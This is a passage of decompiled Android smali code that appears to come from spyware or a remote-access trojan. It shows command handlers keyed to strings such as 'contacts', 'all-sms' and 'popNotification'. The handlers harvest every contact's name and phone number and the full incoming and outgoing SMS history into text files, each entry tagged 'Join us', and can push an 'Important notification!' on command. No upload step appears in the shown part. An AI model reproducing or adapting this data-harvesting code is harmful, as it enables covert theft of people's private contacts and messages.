    sget-object v5, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v6, 0x0

    const-string v7, "contact_id = ?"

    filled-new-array {v4}, [Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    move-object v4, v2

    invoke-virtual/range {v4 .. v9}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v4

    :goto_9
    if-eqz v4, :cond_15

    invoke-interface {v4}, Landroid/database/Cursor;->moveToNext()Z

    move-result v5

    const/4 v6, 0x1

    if-ne v5, v6, :cond_15

    const-string v5, "data1"

    invoke-interface {v4, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v4, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    const-string v6, "pCur.getString(\n        \u2026                        )"

    invoke-static {v5, v6}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v1, v5}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_9

    :cond_15
    if-eqz v4, :cond_14

    invoke-interface {v4}, Landroid/database/Cursor;->close()V

    goto :goto_8

    :cond_16
    if-eqz v10, :cond_17

    invoke-interface {v10}, Landroid/database/Cursor;->close()V

    :cond_17
    invoke-virtual {v3, v1}, Lb/f;->N(Ljava/lang/Object;)Ljava/lang/Object;

    goto/16 :goto_1

    :cond_18
    invoke-virtual {v1}, Lb/e;->f()Ljava/lang/Object;

    goto/16 :goto_1

    :sswitch_b
    const-string v1, "contacts"

    .line 49
    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_19

    goto/16 :goto_1

    :cond_19
    iget-object v1, v0, Lb/d;->l:Lb/g;

    sget-object v2, Lb/c;->k:Lb/c;

    .line 50
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 51
    new-instance v3, Lb/f;

    invoke-direct {v3, v1, v6, v2}, Lb/f;-><init>(Ljava/lang/Object;ILjava/lang/Object;)V

    new-instance v4, Lc;

    const/4 v5, 0x1

    invoke-direct {v4, v1, v5, v2}, Lc;-><init>(Ljava/lang/Object;ILjava/lang/Object;)V

    iget-object v1, v1, Lb/g;->d:Le/c;

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "android.permission.READ_CONTACTS"

    .line 52
    iget-object v5, v1, Le/c;->a:Landroid/content/Context;

    invoke-static {v5, v2}, Lb/b;->f(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_1e

    const-string v2, "( Contacts )"

    const-string v4, ".txt"

    invoke-static {v2, v4}, Lb/b;->g(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v2

    sget-object v4, Lb5/a;->a:Ljava/nio/charset/Charset;

    new-instance v6, Ljava/io/OutputStreamWriter;

    new-instance v7, Ljava/io/FileOutputStream;

    invoke-direct {v7, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v6, v7, v4}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;Ljava/nio/charset/Charset;)V

    invoke-virtual {v5}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    const-string v5, "context.contentResolver"

    invoke-static {v4, v5}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v9, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    const/4 v10, 0x0

    const/4 v11, 0x0

    const/4 v12, 0x0

    const/4 v13, 0x0

    move-object v8, v4

    invoke-virtual/range {v8 .. v13}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v5

    if-eqz v5, :cond_1c

    invoke-interface {v5}, Landroid/database/Cursor;->getCount()I

    move-result v7

    if-lez v7, :cond_1c

    :cond_1a
    :goto_a
    invoke-interface {v5}, Landroid/database/Cursor;->moveToNext()Z

    move-result v7

    if-eqz v7, :cond_1c

    const-string v7, "_id"

    invoke-interface {v5, v7}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v5, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    const-string v8, "cur.getString(\n         \u2026ID)\n                    )"

    invoke-static {v7, v8}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v8, "display_name"

    invoke-interface {v5, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v5, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v14

    const-string v8, "cur.getString(\n         \u2026  )\n                    )"

    invoke-static {v14, v8}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v8, "has_phone_number"

    invoke-interface {v5, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v5, v8}, Landroid/database/Cursor;->getInt(I)I

    move-result v8

    if-lez v8, :cond_1a

    sget-object v9, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v10, 0x0

    const-string v11, "contact_id = ?"

    filled-new-array {v7}, [Ljava/lang/String;

    move-result-object v12

    const/4 v13, 0x0

    move-object v8, v4

    invoke-virtual/range {v8 .. v13}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    :goto_b
    if-eqz v7, :cond_1b

    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z

    move-result v8

    const/4 v9, 0x1

    if-ne v8, v9, :cond_1b

    const-string v8, "data1"

    invoke-interface {v7, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v7, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    const-string v9, "pCur.getString(\n        \u2026                        )"

    invoke-static {v8, v9}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "Name : "

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v10, "\nPhone Number : "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, "\nJoin us : "

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v8, v1, Le/c;->b:Ljava/lang/String;

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, "\n\n\n"

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/io/Writer;->write(Ljava/lang/String;)V

    goto :goto_b

    :cond_1b
    if-eqz v7, :cond_1a

    invoke-interface {v7}, Landroid/database/Cursor;->close()V

    goto/16 :goto_a

    :cond_1c
    if-eqz v5, :cond_1d

    invoke-interface {v5}, Landroid/database/Cursor;->close()V

    :cond_1d
    invoke-virtual {v6}, Ljava/io/OutputStreamWriter;->flush()V

    invoke-virtual {v6}, Ljava/io/OutputStreamWriter;->close()V

    invoke-virtual {v3, v2}, Lb/f;->N(Ljava/lang/Object;)Ljava/lang/Object;

    goto/16 :goto_1

    :cond_1e
    invoke-virtual {v4}, Lc;->f()Ljava/lang/Object;

    goto/16 :goto_1

    :sswitch_c
    const-string v1, "all-sms"

    .line 53
    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_1f

    goto/16 :goto_1

    :cond_1f
    iget-object v1, v0, Lb/d;->l:Lb/g;

    .line 54
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 55
    new-instance v2, Lb/d;

    invoke-direct {v2, v1, v8}, Lb/d;-><init>(Lb/g;I)V

    new-instance v3, Lb/e;

    invoke-direct {v3, v1, v11}, Lb/e;-><init>(Lb/g;I)V

    iget-object v4, v1, Lb/g;->d:Le/c;

    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 56
    iget-object v5, v4, Le/c;->a:Landroid/content/Context;

    const-string v6, "android.permission.READ_SMS"

    invoke-static {v5, v6}, Lb/b;->f(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v8

    iget-object v4, v4, Le/c;->b:Ljava/lang/String;

    const-string v9, "\n\n\n"

    const-string v11, "\nJoin us : "

    const-string v12, "\nText : "

    const-string v13, "Address : "

    const-string v14, "body"

    const-string v15, "address"

    const-string v10, ".txt"

    if-eqz v8, :cond_22

    const-string v3, "( Incoming Sms )"

    invoke-static {v3, v10}, Lb/b;->g(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v3

    sget-object v8, Lb5/a;->a:Ljava/nio/charset/Charset;

    new-instance v7, Ljava/io/OutputStreamWriter;

    new-instance v0, Ljava/io/FileOutputStream;

    invoke-direct {v0, v3}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v7, v0, v8}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;Ljava/nio/charset/Charset;)V

    const-string v0, "content://sms/inbox"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    const-string v8, "parse(\"content://sms/inbox\")"

    invoke-static {v0, v8}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v5}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v18

    const/16 v20, 0x0

    const/16 v21, 0x0

    const/16 v22, 0x0

    const/16 v23, 0x0

    move-object/from16 v19, v0

    invoke-virtual/range {v18 .. v23}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    :goto_c
    if-eqz v0, :cond_20

    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v8

    if-eqz v8, :cond_20

    invoke-interface {v0, v15}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v0, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    move-object/from16 v16, v15

    invoke-interface {v0, v14}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v15

    invoke-interface {v0, v15}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v15

    move-object/from16 v18, v14

    new-instance v14, Ljava/lang/StringBuilder;

    invoke-direct {v14, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v14, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/io/Writer;->write(Ljava/lang/String;)V

    move-object/from16 v15, v16

    move-object/from16 v14, v18

    goto :goto_c

    :cond_20
    move-object/from16 v18, v14

    move-object/from16 v16, v15

    if-eqz v0, :cond_21

    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    :cond_21
    invoke-virtual {v7}, Ljava/io/OutputStreamWriter;->flush()V

    invoke-virtual {v7}, Ljava/io/OutputStreamWriter;->close()V

    invoke-virtual {v2, v3}, Lb/d;->N(Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_d

    :cond_22
    move-object/from16 v18, v14

    move-object/from16 v16, v15

    invoke-virtual {v3}, Lb/e;->f()Ljava/lang/Object;

    .line 57
    :goto_d
    new-instance v0, Lb/d;

    const/16 v2, 0x8

    invoke-direct {v0, v1, v2}, Lb/d;-><init>(Lb/g;I)V

    new-instance v2, Lb/e;

    const/4 v3, 0x6

    invoke-direct {v2, v1, v3}, Lb/e;-><init>(Lb/g;I)V

    .line 58
    invoke-static {v5, v6}, Lb/b;->f(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_25

    const-string v1, "( Outgoing Sms )"

    invoke-static {v1, v10}, Lb/b;->g(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v1

    sget-object v2, Lb5/a;->a:Ljava/nio/charset/Charset;

    new-instance v3, Ljava/io/OutputStreamWriter;

    new-instance v6, Ljava/io/FileOutputStream;

    invoke-direct {v6, v1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v3, v6, v2}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;Ljava/nio/charset/Charset;)V

    const-string v2, "content://sms/sent"

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    const-string v6, "parse(\"content://sms/sent\")"

    invoke-static {v2, v6}, Ll4/h;->h0(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v5}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v19

    const/16 v21, 0x0

    const/16 v22, 0x0

    const/16 v23, 0x0

    const/16 v24, 0x0

    move-object/from16 v20, v2

    invoke-virtual/range {v19 .. v24}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v2

    :goto_e
    if-eqz v2, :cond_23

    invoke-interface {v2}, Landroid/database/Cursor;->moveToNext()Z

    move-result v5

    if-eqz v5, :cond_23

    move-object/from16 v5, v16

    invoke-interface {v2, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v2, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    move-object/from16 v7, v18

    invoke-interface {v2, v7}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v2, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/io/Writer;->write(Ljava/lang/String;)V

    goto :goto_e

    :cond_23
    if-eqz v2, :cond_24

    invoke-interface {v2}, Landroid/database/Cursor;->close()V

    :cond_24
    invoke-virtual {v3}, Ljava/io/OutputStreamWriter;->flush()V

    invoke-virtual {v3}, Ljava/io/OutputStreamWriter;->close()V

    invoke-virtual {v0, v1}, Lb/d;->N(Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_f

    :cond_25
    invoke-virtual {v2}, Lb/e;->f()Ljava/lang/Object;

    :cond_26
    :goto_f
    move-object/from16 v1, p0

    goto/16 :goto_1a

    :sswitch_d
    const-string v0, "popNotification"

    .line 59
    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_27

    :goto_10
    goto :goto_f

    :cond_27
    const-string v0, "text"

    invoke-interface {v4, v0}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    if-eqz v0, :cond_26

    move-object/from16 v1, p0

    iget-object v2, v1, Lb/d;->l:Lb/g;

    .line 60
    iget-object v3, v2, Lb/g;->a:Landroid/content/Context;

    const-string v4, "notification"

    .line 61
    invoke-virtual {v3, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/NotificationManager;

    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v5, 0x1a

    if-lt v4, v5, :cond_28

    invoke-static {}, Landroidx/compose/ui/platform/j;->k()V

    invoke-static {}, Landroidx/compose/ui/platform/j;->b()Landroid/app/NotificationChannel;

    move-result-object v7

    if-eqz v3, :cond_28

    invoke-static {v3, v7}, Landroidx/compose/ui/platform/j;->l(Landroid/app/NotificationManager;Landroid/app/NotificationChannel;)V

    :cond_28
    iget-object v7, v2, Lb/g;->a:Landroid/content/Context;

    const-string v8, "rainbow-channel"

    .line 62
    new-instance v10, Ljava/util/ArrayList;

    invoke-direct {v10}, Ljava/util/ArrayList;-><init>()V

    new-instance v11, Ljava/util/ArrayList;

    invoke-direct {v11}, Ljava/util/ArrayList;-><init>()V

    new-instance v12, Ljava/util/ArrayList;

    invoke-direct {v12}, Ljava/util/ArrayList;-><init>()V

    new-instance v13, Landroid/app/Notification;

    invoke-direct {v13}, Landroid/app/Notification;-><init>()V

    move-object/from16 v19, v10

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v9

    iput-wide v9, v13, Landroid/app/Notification;->when:J

    const/4 v9, -0x1

    iput v9, v13, Landroid/app/Notification;->audioStreamType:I

    new-instance v9, Ljava/util/ArrayList;

    invoke-direct {v9}, Ljava/util/ArrayList;-><init>()V

    const v10, 0x7f07007d

    iput v10, v13, Landroid/app/Notification;->icon:I

    const-string v10, "Important notification!"

    .line 63
    invoke-virtual {v10}, Ljava/lang/String;->length()I

    move-result v14

    const/16 v15, 0x1400

    if-le v14, v15, :cond_29

    invoke-virtual {v10, v6, v15}, Ljava/lang/String;->subSequence(II)Ljava/lang/CharSequence;

    move-result-object v10

    .line 64
    :cond_29
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v14

    if-le v14, v15, :cond_2a

    invoke-virtual {v0, v6, v15}, Ljava/lang/String;->subSequence(II)Ljava/lang/CharSequence;

    move-result-object v0

    .line 65
    :cond_2a
    invoke-static {v3}, Ll4/h;->e0(Ljava/lang/Object;)V

    .line 66
    new-instance v14, Ljava/util/ArrayList;

    invoke-direct {v14}, Ljava/util/ArrayList;-><init>()V

    new-instance v14, Landroid/os/Bundle;

    invoke-direct {v14}, Landroid/os/Bundle;-><init>()V

    if-lt v4, v5, :cond_2b

    invoke-static {v7, v8}, Lf2/q;->a(Landroid/content/Context;Ljava/lang/String;)Landroid/app/Notification$Builder;

    move-result-object v7

    goto :goto_11

    :cond_2b
    new-instance v15, Landroid/app/Notification$Builder;

    invoke-direct {v15, v7}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    move-object v7, v15

    :goto_11
    iget-wide v5, v13, Landroid/app/Notification;->when:J

    invoke-virtual {v7, v5, v6}, Landroid/app/Notification$Builder;->setWhen(J)Landroid/app/Notification$Builder;

    move-result-object v5

    iget v6, v13, Landroid/app/Notification;->icon:I

    iget v15, v13, Landroid/app/Notification;->iconLevel:I

    invoke-virtual {v5, v6, v15}, Landroid/app/Notification$Builder;->setSmallIcon(II)Landroid/app/Notification$Builder;

    move-result-object v5

    iget-object v6, v13, Landroid/app/Notification;->contentView:Landroid/widget/RemoteViews;

    invoke-virtual {v5, v6}, Landroid/app/Notification$Builder;->setContent(Landroid/widget/RemoteViews;)Landroid/app/Notification$Builder;

    move-result-object v5

    iget-object v6, v13, Landroid/app/Notification;->tickerText:Ljava/lang/CharSequence;

    const/4 v15, 0x0

    invoke-virtual {v5, v6, v15}, Landroid/app/Notification$Builder;->setTicker(Ljava/lang/CharSequence;Landroid/widget/RemoteViews;)Landroid/app/Notification$Builder;

    move-result-object v5

    iget-object v6, v13, Landroid/app/Notification;->vibrate:[J

    invoke-virtual {v5, v6}, Landroid/app/Notification$Builder;->setVibrate([J)Landroid/app/Notification$Builder;

    move-result-object v5

    iget v6, v13, Landroid/app/Notification;->ledARGB:I

    iget v15, v13, Landroid/app/Notification;->ledOnMS:I

    iget v1, v13, Landroid/app/Notification;->ledOffMS:I

    invoke-virtual {v5, v6, v15, v1}, Landroid/app/Notification$Builder;->setLights(III)Landroid/app/Notification$Builder;

    move-result-object v1

    iget v5, v13, Landroid/app/Notification;->flags:I

    const/4 v6, 0x2

    and-int/2addr v5, v6

    if-eqz v5, :cond_2c

    const/4 v5, 0x1

    goto :goto_12

    :cond_2c
    const/4 v5, 0x0

    :goto_12
    invoke-virtual {v1, v5}, Landroid/app/Notification$Builder;->setOngoing(Z)Landroid/app/Notification$Builder;

    move-result-object v1

    iget v5, v13, Landroid/app/Notification;->flags:I

    const/16 v6, 0x8

    and-int/2addr v5, v6

    if-eqz v5, :cond_2d

    const/4 v5, 0x1

    goto :goto_13

    :cond_2d
    const/4 v5, 0x0

    :goto_13
    invoke-virtual {v1, v5}, Landroid/app/Notification$Builder;->setOnlyAlertOnce(Z)Landroid/app/Notification$Builder;

    move-result-object v1

    iget v5, v13, Landroid/app/Notification;->flags:I

    and-int/lit8 v5, v5, 0x10

    if-eqz v5, :cond_2e

    const/4 v5, 0x1

    goto :goto_14

    :cond_2e
    const/4 v5, 0x0

    :goto_14
    invoke-virtual {v1, v5}, Landroid/app/Notification$Builder;->setAutoCancel(Z)Landroid/app/Notification$Builder;

    move-result-object v1

    iget v5, v13, Landroid/app/Notification;->defaults:I

    invoke-virtual {v1, v5}, Landroid/app/Notification$Builder;->setDefaults(I)Landroid/app/Notification$Builder;

    move-result-object v1

    invoke-virtual {v1, v10}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentInfo(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentIntent(Landroid/app/PendingIntent;)Landroid/app/Notification$Builder;

    move-result-object v0

    iget-object v5, v13, Landroid/app/Notification;->deleteIntent:Landroid/app/PendingIntent;

    invoke-virtual {v0, v5}, Landroid/app/Notification$Builder;->setDeleteIntent(Landroid/app/PendingIntent;)Landroid/app/Notification$Builder;

    move-result-object v0

    iget v5, v13, Landroid/app/Notification;->flags:I

    const/16 v6, 0x80

    and-int/2addr v5, v6

    if-eqz v5, :cond_2f

    const/4 v5, 0x1

    goto :goto_15

    :cond_2f
    const/4 v5, 0x0

    :goto_15
    invoke-virtual {v0, v1, v5}, Landroid/app/Notification$Builder;->setFullScreenIntent(Landroid/app/PendingIntent;Z)Landroid/app/Notification$Builder;

    move-result-object v0

    const/4 v5, 0x0

    invoke-virtual {v0, v5}, Landroid/app/Notification$Builder;->setNumber(I)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0, v5, v5, v5}, Landroid/app/Notification$Builder;->setProgress(IIZ)Landroid/app/Notification$Builder;

    invoke-static {v7, v1}, Lf2/o;->b(Landroid/app/Notification$Builder;Landroid/graphics/drawable/Icon;)Landroid/app/Notification$Builder;

    invoke-static {v7, v1}, Lf2/j;->c(Landroid/app/Notification$Builder;Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-static {v0, v5}, Lf2/j;->d(Landroid/app/Notification$Builder;Z)Landroid/app/Notification$Builder;

    move-result-object v0

    const/4 v6, 0x4

    invoke-static {v0, v6}, Lf2/j;->b(Landroid/app/Notification$Builder;I)Landroid/app/Notification$Builder;

    invoke-virtual/range {v19 .. v19}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-nez v6, :cond_3a

    const/4 v6, 0x1

    invoke-static {v7, v6}, Lf2/k;->a(Landroid/app/Notification$Builder;Z)Landroid/app/Notification$Builder;

    invoke-static {v7, v5}, Lf2/m;->i(Landroid/app/Notification$Builder;Z)Landroid/app/Notification$Builder;

    invoke-static {v7, v1}, Lf2/m;->g(Landroid/app/Notification$Builder;Ljava/lang/String;)Landroid/app/Notification$Builder;

    invoke-static {v7, v1}, Lf2/m;->j(Landroid/app/Notification$Builder;Ljava/lang/String;)Landroid/app/Notification$Builder;

    invoke-static {v7, v5}, Lf2/m;->h(Landroid/app/Notification$Builder;Z)Landroid/app/Notification$Builder;

    invoke-static {v7, v1}, Lf2/n;->b(Landroid/app/Notification$Builder;Ljava/lang/String;)Landroid/app/Notification$Builder;

    invoke-static {v7, v5}, Lf2/n;->c(Landroid/app/Notification$Builder;I)Landroid/app/Notification$Builder;

    invoke-static {v7, v5}, Lf2/n;->f(Landroid/app/Notification$Builder;I)Landroid/app/Notification$Builder;

    invoke-static {v7, v1}, Lf2/n;->d(Landroid/app/Notification$Builder;Landroid/app/Notification;)Landroid/app/Notification$Builder;

    iget-object v0, v13, Landroid/app/Notification;->sound:Landroid/net/Uri;

    iget-object v1, v13, Landroid/app/Notification;->audioAttributes:Landroid/media/AudioAttributes;

    invoke-static {v7, v0, v1}, Lf2/n;->e(Landroid/app/Notification$Builder;Landroid/net/Uri;Ljava/lang/Object;)Landroid/app/Notification$Builder;

    const/16 v0, 0x1c

    if-ge v4, v0, :cond_31

    .line 67
    new-instance v1, Ljava/util/ArrayList;

    invoke-virtual {v11}, Ljava/util/ArrayList;->size()I

    move-result v4

    invoke-direct {v1, v4}, Ljava/util/ArrayList;-><init>(I)V

    invoke-virtual {v11}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v4

    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-nez v5, :cond_30

    .line 68
    invoke-static {v1, v9}, Ll4/h;->A0(Ljava/util/ArrayList;Ljava/util/ArrayList;)Ljava/util/List;

    move-result-object v9

    goto :goto_16

    .line 69
    :cond_30
    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    invoke-static {v0}, La/a;->j(Ljava/lang/Object;)V

    const/4 v0, 0x0

    throw v0

    :cond_31
    :goto_16
    if-eqz v9, :cond_32

    .line 70
    invoke-interface {v9}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_32

    invoke-interface {v9}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_17
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_32

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    invoke-static {v7, v4}, Lf2/n;->a(Landroid/app/Notification$Builder;Ljava/lang/String;)Landroid/app/Notification$Builder;

    goto :goto_17

    :cond_32
    invoke-virtual {v12}, Ljava/util/ArrayList;->size()I

    move-result v1

    if-lez v1, :cond_35

    .line 71
    new-instance v1, Landroid/os/Bundle;

    invoke-direct {v1}, Landroid/os/Bundle;-><init>()V

    const-string v4, "android.car.EXTENSIONS"

    .line 72
    invoke-virtual {v1, v4}, Landroid/os/Bundle;->getBundle(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object v5

    if-nez v5, :cond_33

    new-instance v5, Landroid/os/Bundle;

    invoke-direct {v5}, Landroid/os/Bundle;-><init>()V

    :cond_33
    new-instance v6, Landroid/os/Bundle;

    invoke-direct {v6, v5}, Landroid/os/Bundle;-><init>(Landroid/os/Bundle;)V

    new-instance v9, Landroid/os/Bundle;

    invoke-direct {v9}, Landroid/os/Bundle;-><init>()V

